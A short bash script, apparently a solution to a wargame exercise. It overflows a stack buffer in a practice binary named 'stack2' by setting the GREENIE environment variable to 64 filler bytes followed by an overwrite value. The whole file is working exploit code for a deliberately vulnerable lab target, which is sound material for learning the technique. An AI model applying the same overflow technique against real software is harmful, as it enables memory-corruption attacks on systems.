#!/bin/bash
# Simple Buffer-Overflow
export GREENIE=$(python -c "print('a'*64+ '\x0a\x0d\x0a\x0d')") && ./stack2
